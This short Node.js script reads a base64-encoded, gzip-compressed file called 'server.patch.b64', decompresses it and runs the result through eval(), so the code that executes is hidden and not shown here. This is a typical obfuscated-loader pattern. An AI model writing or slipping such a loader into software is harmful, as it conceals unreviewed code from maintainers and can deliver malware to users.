const zlib = require("zlib");
const fs = require("fs");
const path = require("path");

const encoded = fs.readFileSync(path.join(__dirname, "server.patch.b64"), "utf8").trim();
const source = zlib.gunzipSync(Buffer.from(encoded, "base64")).toString("utf8");
eval(source);
